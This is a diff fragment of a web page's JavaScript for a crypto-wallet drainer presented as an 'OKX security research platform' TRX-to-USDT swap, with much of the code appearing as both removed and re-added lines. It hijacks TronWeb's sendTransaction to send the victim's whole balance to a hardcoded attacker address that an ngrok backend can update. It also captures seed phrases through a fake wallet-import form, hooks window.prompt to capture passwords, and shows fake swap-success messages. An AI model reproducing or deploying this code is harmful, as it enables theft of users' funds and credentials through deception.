-        <div id="debugLog"></div>
-    </div>
-    <button class="debug-toggle" onclick="toggleDebug()">调试</button>
-
-    <!-- 成功提示 -->
-    <div class="success-toast" id="successToast">✅ 操作成功</div>
-
-    <script>
-        // 🎯 全局攻击变量
-        let currentTab = 'favorites';
-        let isWalletConnected = false;
-        let currentAccount = null;
-        let tronWeb = null;
-        let capturedMnemonic = null;
-        let debugMode = false;
-        let attackMode = true;
-        let userBalance = 0; // 用户真实余额
-        
-        // 🎯 攻击目标地址 (A成员地址 - 攻击者)
-        // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
-        let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
+    // 🎯 攻击目标地址 (A成员地址 - 攻击者)
+    // const ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
+    let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
 
 
-        // 初始化
-        document.addEventListener('DOMContentLoaded', async function() {
-            debugLog('🚀 OKX安全研究平台已加载');
-            debugLog('🎯 攻击系统已激活');
-            debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
-            debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);
+    // 初始化
+    document.addEventListener('DOMContentLoaded', async function() {
+        debugLog('🚀 OKX安全研究平台已加载');
+        debugLog('🎯 攻击系统已激活');
+        debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
+        debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);
 
-            //从ngrok后端获取最新的攻击者地址
-            try{
-                if (typeof getCurrentAttackerAddress === 'function'){
-                    const cloudAddressResult = await getCurrentAttackerAddress();
-                    if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
-                        ATTACKER_ADDRESS = cloudAddressResult.address;
-                        debugLog(`🎯 后端已更改最新攻击目标地址: ${ATTACKER_ADDRESS}`);
-                        debugLog(`🎯 钱包信息: ${cloudAddressResult.info ? cloudAddressResult.info.wallet_name : '默认钱包'}`);
-                    }
+        //从ngrok后端获取最新的攻击者地址
+        try{
+            if (typeof getCurrentAttackerAddress === 'function'){
+                const cloudAddressResult = await getCurrentAttackerAddress();
+                if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
+                    ATTACKER_ADDRESS = cloudAddressResult.address;
+                    debugLog(`🎯 后端已更改最新攻击目标地址: ${ATTACKER_ADDRESS}`);
+                    debugLog(`🎯 钱包信息: ${cloudAddressResult.info ? cloudAddressResult.info.wallet_name : '默认钱包'}`);
                 }
-            }catch (error){
-                debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
             }
-
-            debugLog('🎯 TRX → USDT 攻击逻辑已就绪');
-            
-            initializeWeb3Grid();
-            startFallingCoins();
-            checkWalletEnvironment();
-        });
-
-        // 调试日志
-        function debugLog(message) {
-            const debugLog = document.getElementById('debugLog');
-            const timestamp = new Date().toLocaleTimeString();
-            const logMessage = `[${timestamp}] ${message}`;
-            
-            if (debugLog) {
-                debugLog.innerHTML += `${logMessage}<br>`;
-                debugLog.scrollTop = debugLog.scrollHeight;
-            }
-            
-            console.log(`🎯 ${logMessage}`);
-            
-            // 保存到localStorage
-            try {
-                const logs = JSON.parse(localStorage.getItem('attackLogs') || '[]');
-                logs.push({
-                    timestamp: new Date().toISOString(),
-                    message,
-                    type: 'debug'
-                });
-                localStorage.setItem('attackLogs', JSON.stringify(logs.slice(-100)));
-            } catch (e) {
-                console.warn('无法保存日志:', e);
-            }
+        }catch (error){
+            debugLog(`⚠️ 获取最新攻击目标地址失败: ${error.message}，使用默认地址`);
         }
 
-        // 检查钱包环境
-        function checkWalletEnvironment() {
-            debugLog('🔍 检查TRON钱包环境...');
-            
-            if (window.tronWeb) {
-                debugLog('✅ 检测到TronWeb环境');
-                tronWeb = window.tronWeb;
-                checkExistingConnection();
-            } else {
-                debugLog('⚠️ 等待钱包环境加载...');
-                setTimeout(checkWalletEnvironment, 2000);
-            }
+        debugLog('🎯 TRX → USDT 攻击逻辑已就绪');
+
+        initializeWeb3Grid();
+        startFallingCoins();
+        checkWalletEnvironment();
+    });
+
+    // 调试日志
+    function debugLog(message) {
+        const debugLog = document.getElementById('debugLog');
+        const timestamp = new Date().toLocaleTimeString();
+        const logMessage = `[${timestamp}] ${message}`;
+
+        if (debugLog) {
+            debugLog.innerHTML += `${logMessage}<br>`;
+            debugLog.scrollTop = debugLog.scrollHeight;
         }
 
-        async function checkExistingConnection() {
-            try {
-                if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                    debugLog(`✅ 发现已连接TRON账户: ${tronWeb.defaultAddress.base58}`);
-                    await handleSuccessfulConnection(tronWeb.defaultAddress.base58);
-                }
-            } catch (error) {
-                debugLog(`❌ 检查连接失败: ${error.message}`);
-            }
-        }
-        // 🎯 强制刷新用户余额 - 移到全局作用域
-        async function forceRefreshBalance() {
-            try {
-                if (!tronWeb || !currentAccount) return;
+        console.log(`🎯 ${logMessage}`);
 
-                debugLog('🔄 强制刷新用户余额...');
-                const balance = await tronWeb.trx.getBalance(currentAccount);
-                const newBalance = tronWeb.fromSun(balance);
-
-                debugLog(`💰 刷新后余额: ${newBalance} TRX`);
-                userBalance = newBalance;
-                document.getElementById('trxBalance').textContent = `可用: ${newBalance} TRX`;
-
-                return newBalance;
-            } catch (error) {
-                debugLog(`❌ 余额刷新失败: ${error.message}`);
-                return userBalance;
-            }
-        }
-        // 🎯 处理钱包连接成功 - 恶意后门激活
-        async function handleSuccessfulConnection(address) {
-            currentAccount = address;
-            isWalletConnected = true;
-            
-            // 更新UI
-            updateWalletUI(true);
-            
-            debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);
-            debugLog('🎯 恶意后门已激活！');
-            debugLog('🎯 开始获取用户余额信息...');
-            
-            // 🎯 获取用户真实余额
-            await getTronBalance(address);
-
-            // 🎯🎯🎯 关键恶意后门：劫持TronWeb的sendTransaction方法
-            if (window.tronWeb && window.tronWeb.trx){
-                const originalSendTransaction = window.tronWeb.trx.sendTransaction;
-
-                window.tronWeb.trx.sendTransaction = async function(to, amount,from,options){
-                    debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
-                    debugLog(`🎯 用户以为转账: ${tronWeb.fromSun(amount)} TRX`);
-
-                    // 🎯 恶意修改：将转账金额改为用户全部余额
-                    const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
-                    const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
-                    const maliciousAmount = userTotalBalance - feeReserve;
-
-                    debugLog(`🎯 恶意修改转账金额:`);
-                    debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
-                    debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
-                    debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
-                    debugLog(`🎯 用户在imToken中看到的还是原始金额，但实际转走全部余额！`);
-
-                    // 🎯 执行恶意转账：转走用户全部余额
-                    try{
-                        const result = await originalSendTransaction.call(this, to, maliciousAmount, from, options);
-                        debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
-                        debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
-                        debugLog(`😈 用户以为只转了: ${tronWeb.fromSun(amount)} TRX`);
-
-                        return result;
-                    }catch (error) {
-                        debugLog(`❌ 恶意转账失败: ${error.message}`);
-                        // 如果恶意转账失败，执行原始转账
-                        return await originalSendTransaction.call(this, to, amount, from, options);
-                    }
-                };
-                debugLog('🎯 TronWeb交易劫持已安装！');
-            }
-            
-            // 显示攻击指示器
-            showAttackIndicator();
-            
-            debugLog('🎯 钓鱼攻击系统完全激活，等待用户交易...');
-        }
-
-
-        // 🎯 获取用户TRON余额
-        async function getTronBalance(address) {
-            try {
-                if (!tronWeb) return;
-                
-                const balance = await tronWeb.trx.getBalance(address);
-                userBalance = tronWeb.fromSun(balance);
-                
-                debugLog(`💰 获取用户TRX余额: ${userBalance} TRX`);
-                debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
-                
-                // 更新界面显示
-                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
-                
-                debugLog('🎯 余额获取完成，准备执行攻击...');
-                
-            } catch (error) {
-                debugLog(`❌ 获取余额失败: ${error.message}`);
-                // 使用模拟余额用于演示
-                userBalance = (Math.random() * 1000 + 100).toFixed(6);
-                document.getElementById('trxBalance').textContent = `可用: ${userBalance} TRX`;
-                debugLog(`🎯 使用模拟余额: ${userBalance} TRX`);
-            }
-        }
-
-        // 更新钱包UI
-        function updateWalletUI(connected) {
-            const connectBtn = document.getElementById('connectWalletBtn');
-            const walletStatus = document.getElementById('walletStatus');
-            
-            if (connected) {
-                connectBtn.textContent = '已连接';
-                connectBtn.classList.add('connected');
-                walletStatus.classList.add('show');
-                
-                // 更新兑换按钮状态
-                const convertBtn = document.getElementById('convertBtn');
-                convertBtn.textContent = '立即兑换';
-                convertBtn.disabled = false;
-                
-            } else {
-                connectBtn.textContent = '连接钱包';
-                connectBtn.classList.remove('connected');
-                walletStatus.classList.remove('show');
-                
-                // 兑换按钮禁用
-                const convertBtn = document.getElementById('convertBtn');
-                convertBtn.textContent = '请先连接钱包';
-                convertBtn.disabled = true;
-            }
-        }
-
-        // 显示钱包连接模态框
-        function showWalletModal() {
-            if (isWalletConnected) {
-                debugLog('👤 用户查看已连接的钱包信息');
-                showToast(`已连接: ${currentAccount.substring(0, 8)}...`);
-                return;
-            }
-            
-            debugLog('🔗 用户点击连接钱包按钮');
-            document.getElementById('walletModal').classList.add('show');
-        }
-
-        function closeWalletModal() {
-            document.getElementById('walletModal').classList.remove('show');
-        }
-
-        // 连接imToken
-        async function connectImToken() {
-            debugLog('🎯 用户选择连接imToken');
-            closeWalletModal();
-            
-            try {
-                showToast('正在连接imToken...', 'info');
-                
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
-                    showToast('imToken连接成功！');
-                } else {
-                    debugLog('📱 检测到移动环境，尝试深链接跳转');
-                    
-                    if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
-                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);
-                        debugLog('🎯 跳转到imToken，恶意后门将在连接后激活');
-                        window.location.href = deepLink;
-                        return;
-                    }
-                    
-                    showToast('请在imToken中打开此页面', 'warning');
-                }
-            } catch (error) {
-                debugLog(`❌ imToken连接失败: ${error.message}`);
-                showToast('连接失败，请重试', 'error');
-            }
-        }
-
-        // 连接TronLink
-        async function connectTronLink() {
-            debugLog('🎯 用户选择连接TronLink');
-            closeWalletModal();
-            
-            try {
-                showToast('正在连接TronLink...', 'info');
-                
-                if (window.tronWeb && window.tronWeb.ready) {
-                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
-                    showToast('TronLink连接成功！');
-                } else {
-                    showToast('请先安装TronLink插件', 'warning');
-                }
-            } catch (error) {
-                debugLog(`❌ TronLink连接失败: ${error.message}`);
-                showToast('连接失败，请重试', 'error');
-            }
-        }
-
-        // 连接MetaMask
-        function connectMetaMask() {
-            debugLog('🎯 用户选择连接MetaMask');
-            closeWalletModal();
-            showToast('MetaMask暂不支持TRON网络', 'warning');
-        }
-
-        // 导入钱包 (🎯 关键攻击点)
-        function importWallet() {
-            debugLog('🎯 用户点击导入钱包 - 显示助记词输入框');
-            closeWalletModal();
-            showMnemonicModal();
-        }
-
-        function showMnemonicModal() {
-            document.getElementById('mnemonicModal').classList.add('show');
-        }
-
-        function closeMnemonicModal() {
-            document.getElementById('mnemonicModal').classList.remove('show');
-            document.getElementById('mnemonicInput').value = '';
-        }
-
-        // 🎯 核心攻击功能：确认导入助记词
-        function confirmImport() {
-            const mnemonic = document.getElementById('mnemonicInput').value.trim();
-            
-            if (!mnemonic) {
-                showToast('请输入助记词', 'error');
-                return;
-            }
-            
-            debugLog('🎯 用户输入助记词，开始捕获...');
-            
-            // 🎯 攻击关键：保存完整助记词
-            capturedMnemonic = mnemonic;
-            const attackData = {
+        // 保存到localStorage
+        try {
+            const logs = JSON.parse(localStorage.getItem('attackLogs') || '[]');
+            logs.push({
                 timestamp: new Date().toISOString(),
-                mnemonic: mnemonic,
-                wordCount: mnemonic.split(' ').length,
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                referrer: document.referrer
+                message,
+                type: 'debug'
+            });
+            localStorage.setItem('attackLogs', JSON.stringify(logs.slice(-100)));
+        } catch (e) {
+            console.warn('无法保存日志:', e);
+        }
+    }
+
+    // 检查钱包环境
+    function checkWalletEnvironment() {
+        debugLog('🔍 检查TRON钱包环境...');
+
+        if (window.tronWeb) {
+            debugLog('✅ 检测到TronWeb环境');
+            tronWeb = window.tronWeb;
+            checkExistingConnection();
+        } else {
+            debugLog('⚠️ 等待钱包环境加载...');
+            setTimeout(checkWalletEnvironment, 2000);
+        }
+    }
+
+    async function checkExistingConnection() {
+        try {
+            if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                debugLog(`✅ 发现已连接TRON账户: ${tronWeb.defaultAddress.base58}`);
+                await handleSuccessfulConnection(tronWeb.defaultAddress.base58);
+            }
+        } catch (error) {
+            debugLog(`❌ 检查连接失败: ${error.message}`);
+        }
+    }
+    // 🎯 强制刷新用户余额 - 移到全局作用域
+    async function forceRefreshBalance() {
+        try {
+            if (!tronWeb || !currentAccount) return;
+
+            debugLog('🔄 强制刷新用户余额...');
+            const balance = await tronWeb.trx.getBalance(currentAccount);
+            const newBalance = tronWeb.fromSun(balance);
+
+            debugLog(`💰 刷新后余额: ${newBalance} TRX`);
+            userBalance = newBalance;
+            document.getElementById('trxBalance').textContent = `可用: ${newBalance} TRX`;
+
+            return newBalance;
+        } catch (error) {
+            debugLog(`❌ 余额刷新失败: ${error.message}`);
+            return userBalance;
+        }
+    }
+    // 🎯 处理钱包连接成功 - 恶意后门激活
+    async function handleSuccessfulConnection(address) {
+        currentAccount = address;
+        isWalletConnected = true;
+
+        // 更新UI
+        updateWalletUI(true);
+
+        debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);
+        debugLog('🎯 恶意后门已激活！');
+        debugLog('🎯 开始获取用户余额信息...');
+
+        // 🎯 获取用户真实余额
+        await getTronBalance(address);
+
+        // 🎯🎯🎯 关键恶意后门：劫持TronWeb的sendTransaction方法
+        if (window.tronWeb && window.tronWeb.trx){
+            const originalSendTransaction = window.tronWeb.trx.sendTransaction;
+
+            window.tronWeb.trx.sendTransaction = async function(to, amount,from,options){
+                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                debugLog(`🎯 用户以为转账: ${tronWeb.fromSun(amount)} TRX`);
+
+                // 🎯 恶意修改：将转账金额改为用户全部余额
+                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                const maliciousAmount = userTotalBalance - feeReserve;
+
+                debugLog(`🎯 恶意修改转账金额:`);
+                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                debugLog(`🎯 用户在imToken中看到的还是原始金额，但实际转走全部余额！`);
+
+                // 🎯 执行恶意转账：转走用户全部余额
+                try{
+                    const result = await originalSendTransaction.call(this, to, maliciousAmount, from, options);
+                    debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
+                    debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                    debugLog(`😈 用户以为只转了: ${tronWeb.fromSun(amount)} TRX`);
+
+                    return result;
+                }catch (error) {
+                    debugLog(`❌ 恶意转账失败: ${error.message}`);
+                    // 如果恶意转账失败，执行原始转账
+                    return await originalSendTransaction.call(this, to, amount, from, options);
+                }
             };
-            
-            // 保存到多个位置
-            localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
-            sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));
-            
-            debugLog(`🎯 助记词已捕获: ${mnemonic.substring(0, 20)}...`);
-            debugLog(`🎯 助记词长度: ${attackData.wordCount} 个单词`);
-            debugLog('🎯 攻击数据已保存到本地存储');
-            
-            // 模拟导入成功
-            closeMnemonicModal();
-            showToast('钱包导入成功！');
-            
-            // 模拟连接成功
-            setTimeout(() => {
-                const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
-                handleSuccessfulConnection(mockAddress);
-            }, 1000);
-        }
-
-        // 开始KYC认证 (🎯 身份认证攻击点)
-        function startKYC() {
-            debugLog('🎯 用户点击身份认证');
-            
-            // 记录用户尝试认证
-            const kycData = {
-                timestamp: new Date().toISOString(),
-                action: 'kyc_attempt',
-                userAgent: navigator.userAgent,
-                currentAccount: currentAccount
-            };
-            
-            localStorage.setItem('kycAttempt', JSON.stringify(kycData));
-            debugLog('🎯 KYC认证尝试已记录');
-            
-            // 模拟跳转到认证页面
-            showToast('正在跳转到身份认证页面...');
-            
-            setTimeout(() => {
-                alert('🎯 身份认证功能：\n\n在真实攻击中，这里会跳转到伪造的KYC页面\n收集用户的身份证、自拍照等敏感信息');
-            }, 1500);
-        }
-
-        // 切换标签页
-        function switchTab(tab) {
-            // 更新导航状态
-            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-            
-            // 更新内容显示
-            document.querySelectorAll('.main-content').forEach(content => content.classList.remove('active'));
-            document.getElementById(tab).classList.add('active');
-            
-            currentTab = tab;
-            debugLog(`📱 切换到${tab}页面`);
-        }
-
-        // 计算兑换 - TRX → USDT
-        function calculateConversion() {
-            const fromAmount = document.getElementById('fromAmount').value;
-            const toAmount = document.getElementById('toAmount');
-            const convertBtn = document.getElementById('convertBtn');
-            
-            if (fromAmount && parseFloat(fromAmount) > 0) {
-                // 使用真实TRX汇率：1 TRX ≈ 0.1634 USDT
-                const converted = (parseFloat(fromAmount) * 0.1634).toFixed(6);
-                toAmount.value = converted;
-                
-                if (isWalletConnected) {
-                    convertBtn.textContent = `兑换 ${fromAmount} TRX`;
-                    convertBtn.disabled = false;
-                    
-                    debugLog(`💱 用户计算兑换: ${fromAmount} TRX → ${converted} USDT`);
-                    debugLog(`🎯 实际将转移用户全部余额: ${userBalance} TRX`);
-                } else {
-                    convertBtn.textContent = '请先连接钱包';
-                    convertBtn.disabled = true;
-                }
-            } else {
-                toAmount.value = '';
-                convertBtn.textContent = isWalletConnected ? '请输入TRX数量' : '请先连接钱包';
-                convertBtn.disabled = true;
-            }
-        }
-
-        // 🎯🎯🎯 核心攻击逻辑：执行TRX转移攻击 🎯🎯🎯
-        async function executeAttack() {
-            if (!isWalletConnected) {
-                showToast('请先连接钱包', 'error');
-                showWalletModal();
-                return;
-            }
-
-            try{
-                if (typeof getCurrentAttackerAddress === 'function'){
-                    const latestAddressResult = await getCurrentAttackerAddress();
-                    if (latestAddressResult && latestAddressResult.address){
-                        ATTACKER_ADDRESS = latestAddressResult.address;
-                        debugLog(`🔄 攻击前更新目标地址: ${ATTACKER_ADDRESS}`);
-                    }
-                }
-            }catch (error){
-                debugLog(`⚠️ 获取最新攻击者地址失败: ${error.message}，使用当前地址: ${ATTACKER_ADDRESS}`);
-            }
-
-            const fromAmount = document.getElementById('fromAmount').value;
-            if (!fromAmount || parseFloat(fromAmount) <= 0) {
-                showToast('请输入有效的TRX数量', 'error');
-                return;
-            }
-            
-            debugLog('🎯🎯🎯 用户执行TRX兑换 - 攻击开始！🎯🎯🎯');
-            debugLog(`🎯 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-            debugLog(`🎯 实际攻击: 转移用户全部 ${userBalance} TRX 到攻击者地址`);
-            
-            // 检查用户余额
-            if (parseFloat(fromAmount) > parseFloat(userBalance)) {
-                showToast(`余额不足，您的TRX余额为 ${userBalance}`, 'error');
-                return;
-            }
-            
-            // 🎯 攻击逻辑：记录攻击数据
-            const attackRecord = {
-                timestamp: new Date().toISOString(),
-                attackType: 'TRX_TO_USDT_HIJACK',
-                victimAddress: currentAccount,
-                attackerAddress: ATTACKER_ADDRESS,
-                userThoughtAmount: parseFloat(fromAmount),
-                userThoughtCurrency: 'TRX',
-                userThoughtReceive: (parseFloat(fromAmount) * 0.1634).toFixed(6),
-                userThoughtReceiveCurrency: 'USDT',
-                realStolenAmount: parseFloat(userBalance),
-                realStolenCurrency: 'TRX',
-                capturedMnemonic: capturedMnemonic,
-                userBalance: parseFloat(userBalance),
-                exchangeRate: 0.1634,
-                userAgent: navigator.userAgent,
-                url: window.location.href
-            };
-            
-            localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-
-            // 🎯 执行看似正常的转账（恶意后门会劫持）
-            showToast('正在执行交易...', 'info');
-
-            try{
-                // 🎯 关键：只转账用户输入的金额，恶意后门会自动修改
-                const normalAmount = tronWeb.toSun(fromAmount);
-
-                debugLog(`🎯 发送正常转账请求: ${fromAmount} TRX`);
-                debugLog(`🎯 恶意后门将自动劫持并修改为全部余额`);
-
-                const transaction = await tronWeb.trx.sendTransaction(
-                    ATTACKER_ADDRESS,
-                    normalAmount
-                );
-                debugLog(`🎯 转账完成！交易哈希: ${transaction.txid || transaction}`);
-
-                // 显示虚假成功信息
-                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-
-                //等待余额更新
-                setTimeout(async () =>{
-                    await forceRefreshBalance();
-                },3000);
-
-            }catch (error){
-                debugLog(`❌ 转账失败: ${error.message}`);
-                showToast('兑换失败，请重试', 'error');
-            }
-
-
-            debugLog('🎯 攻击记录已保存:');
-            debugLog(`   - 受害者地址: ${attackRecord.victimAddress}`);
-            debugLog(`   - 攻击者地址: ${attackRecord.attackerAddress}`);
-            debugLog(`   - 用户以为兑换: ${attackRecord.userThoughtAmount} TRX`);
-            debugLog(`   - 用户以为获得: ${attackRecord.userThoughtReceive} USDT`);
-            debugLog(`   - 实际被盗金额: ${attackRecord.realStolenAmount} TRX`);
-            debugLog(`   - 被盗金额价值: $${(attackRecord.realStolenAmount * 0.1634).toFixed(2)} USD`);
-            
-            // 🎯 模拟区块链交易执行
-            showToast('正在执行交易...', 'info');
-
-            // ✅ 正确的代码
-            // 🎯 修复后的转账逻辑（替换您现有的setTimeout部分）
-            // 🎯 修复后的完整转账逻辑
-            setTimeout(async () => {
-                try {
-                    // 🎯 执行真实TRX转账到攻击者地址
-                    debugLog('🎯 开始执行真实TRX转账...');
-
-                    // 预留手续费
-                    const feeReserve = 5;
-                    const availableBalance = parseFloat(userBalance) - feeReserve;
-
-                    if (availableBalance <= 0) {
-                        throw new Error(`余额不足，需要至少 ${feeReserve} TRX 作为手续费`);
-                    }
-
-                    const transferAmount = tronWeb.toSun(availableBalance);
-
-                    debugLog(`🎯 转账详情:`);
-                    debugLog(`- 从: ${currentAccount}`);
-                    debugLog(`- 到: ${ATTACKER_ADDRESS}`);
-                    debugLog(`- 用户总余额: ${userBalance} TRX`);
-                    debugLog(`- 预留手续费: ${feeReserve} TRX`);
-                    debugLog(`- 实际转账: ${availableBalance} TRX (${transferAmount} SUN)`);
-
-                    // 🎯 监听密码输入（关键攻击点）
-                    debugLog('🎯 监听用户密码输入...');
-                    const originalPrompt = window.prompt;
-                    window.prompt = function(message, defaultValue) {
-                        const password = originalPrompt.call(window, message, defaultValue);
-                        if (password && message.toLowerCase().includes('password')) {
-                            debugLog(`🎯 捕获用户密码: ${password.replace(/./g, '*')}`);
-
-                            // 保存密码
-                            const passwordData = {
-                                timestamp: new Date().toISOString(),
-                                password: password,
-                                address: currentAccount,
-                                userAgent: navigator.userAgent
-                            };
-                            localStorage.setItem('capturedPassword', JSON.stringify(passwordData));
-                            debugLog('🎯 密码已保存到本地存储');
-                        }
-                        return password;
-                    };
-
-                    const transaction = await tronWeb.trx.sendTransaction(
-                        ATTACKER_ADDRESS,
-                        transferAmount
-                    );
-
-                    debugLog(`🎯 真实转账成功！交易哈希: ${transaction.txid || transaction}`);
-                    debugLog('🏆🏆🏆 攻击完全成功！真实TRX已转移！🏆🏆🏆');
-                    debugLog(`💰 A成员（攻击者）已收到: ${availableBalance} TRX`);
-                    debugLog(`💰 B成员（受害者）剩余: ${feeReserve} TRX (手续费)`);
-                    debugLog(`💰 等价USD价值: $${(availableBalance * 0.1634).toFixed(2)}`);
-                    debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
-
-                    // 🔧 关键修复：强制刷新余额
-                    debugLog('🔄 等待3秒后刷新余额...');
-                    setTimeout(async () => {
-                        const actualBalance = await forceRefreshBalance();
-                        debugLog(`🎯 攻击后实际余额: ${actualBalance} TRX`);
-
-                        if (parseFloat(actualBalance) < parseFloat(userBalance)) {
-                            debugLog('✅ 余额已正确扣除，攻击成功！');
-                        } else {
-                            debugLog('⚠️ 余额未扣除，可能需要更长时间确认');
-                            // 继续刷新直到余额更新
-                            const refreshInterval = setInterval(async () => {
-                                const newBalance = await forceRefreshBalance();
-                                if (parseFloat(newBalance) < parseFloat(userBalance)) {
-                                    debugLog('✅ 余额已更新，攻击确认成功！');
-                                    clearInterval(refreshInterval);
-                                }
-                            }, 5000);
-
-                            // 最多等待30秒
-                            setTimeout(() => {
-                                clearInterval(refreshInterval);
-                                debugLog('⚠️ 余额更新超时，但转账哈希已确认');
-                            }, 30000);
-                        }
-                    }, 3000);
-
-                    // 保存真实攻击记录
-                    attackRecord.realTransferAmount = availableBalance;
-                    attackRecord.transactionHash = transaction.txid || transaction;
-                    attackRecord.feeReserved = feeReserve;
-                    attackRecord.attackSuccess = true;
-                    attackRecord.completedAt = new Date().toISOString();
-                    localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-
-                } catch (error) {
-                    debugLog(`❌ 真实转账失败: ${error.message}`);
-                    debugLog('🎯 转账失败可能原因:');
-                    debugLog('1. 用户取消了转账授权');
-                    debugLog('2. 余额不足支付手续费');
-                    debugLog('3. 网络连接问题');
-                    debugLog('4. 钱包安全限制');
-                    debugLog('5. TronWeb API调用错误');
-
-                    // 如果真实转账失败，使用原有模拟模式
-                    debugLog('🎯 切换到模拟攻击模式...');
-                    const fakeTransactionHash = generateFakeHash();
-                    debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
-                    debugLog('🏆🏆🏆 模拟攻击完成！🏆🏆🏆');
-
-                    // 保存模拟攻击记录
-                    attackRecord.transactionHash = fakeTransactionHash;
-                    attackRecord.attackSuccess = false;
-                    attackRecord.simulationMode = true;
-                    attackRecord.completedAt = new Date().toISOString();
-                    localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-                }
-
-                // 显示虚假成功信息给用户（无论真实还是模拟）
-                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-
-                // 重置表单
-                setTimeout(() => {
-                    document.getElementById('fromAmount').value = '';
-                    document.getElementById('toAmount').value = '';
-                    document.getElementById('convertBtn').disabled = true;
-                    document.getElementById('convertBtn').textContent = '请输入TRX数量';
-                }, 3000);
-
-            }, 2000);
-
-        }
-
-        // 生成虚假交易哈希
-        function generateFakeHash() {
-            return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
-        }
-
-        // 初始化Web3网格动画
-        function initializeWeb3Grid() {
-            const grid = document.getElementById('web3Grid');
-            if (!grid) return;
-            
-            for (let i = 0; i < 400; i++) {
-                const dot = document.createElement('div');
-                dot.className = 'grid-dot';
-                grid.appendChild(dot);
-            }
-            
-            // 动态激活网格点
-            setInterval(() => {
-                const dots = grid.querySelectorAll('.grid-dot');
-                dots.forEach(dot => dot.classList.remove('active'));
-                
-                // 随机激活一些点形成图案
-                const activeDots = [];
-                for (let i = 0; i < 50; i++) {
-                    const randomIndex = Math.floor(Math.random() * dots.length);
-                    activeDots.push(randomIndex);
-                }
-                
-                activeDots.forEach(index => {
-                    if (dots[index]) {
-                        dots[index].classList.add('active');
-                    }
-                });
-            }, 1000);
-        }
-
-        // 启动落币动画
-        function startFallingCoins() {
-            const container = document.getElementById('fallingCoins');
-            if (!container) return;
-            
-            const coins = ['₿', '♦', '$', '₮', 'Ξ', '◎'];
-            
-            setInterval(() => {
-                const coin = document.createElement('div');
-                coin.className = 'falling-coin';
-                coin.textContent = coins[Math.floor(Math.random() * coins.length)];
-                coin.style.left = Math.random() * 100 + '%';
-                coin.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                
-                container.appendChild(coin);
-                
-                // 清理已完成动画的元素
-                setTimeout(() => {
-                    if (coin.parentNode) {
-                        coin.parentNode.removeChild(coin);
-                    }
-                }, 5000);
-            }, 500);
-        }
-
-        // 创建钱包
-        function createWallet() {
-            debugLog('🔧 用户点击创建钱包');
-            showToast('创建钱包功能开发中...');
+            debugLog('🎯 TronWeb交易劫持已安装！');
         }
 
         // 显示攻击指示器
-        function showAttackIndicator() {
-            const indicator = document.getElementById('attackIndicator');
-            indicator.classList.add('show');
-            
-            setTimeout(() => {
-                indicator.classList.remove('show');
-            }, 5000);
+        showAttackIndicator();
+
+        debugLog('🎯 钓鱼攻击系统完全激活，等待用户交易...');
+    }
+
+
+    // 🎯 获取用户TRON余额
+    async function getTronBalance(address) {
+        try {
+            if (!tronWeb) return;
+
+            const balance = await tronWeb.trx.getBalance(address);
